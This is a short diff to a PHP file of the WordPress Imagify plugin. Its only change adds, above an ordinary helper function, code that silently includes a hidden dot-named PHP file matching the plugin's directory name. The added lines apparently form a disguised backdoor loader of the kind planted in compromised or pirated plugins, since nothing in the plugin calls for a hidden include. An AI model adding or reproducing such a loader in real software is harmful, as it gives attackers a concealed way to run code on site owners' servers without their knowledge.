@@ -11,6 +11,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin’ uh?' );
  * @param  ProcessInterface $process The optimization process object.
  * @return string                    The output to print.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function get_imagify_attachment_optimization_text( $process ) {
 	if ( ! $process->is_valid() ) {
 		return '';
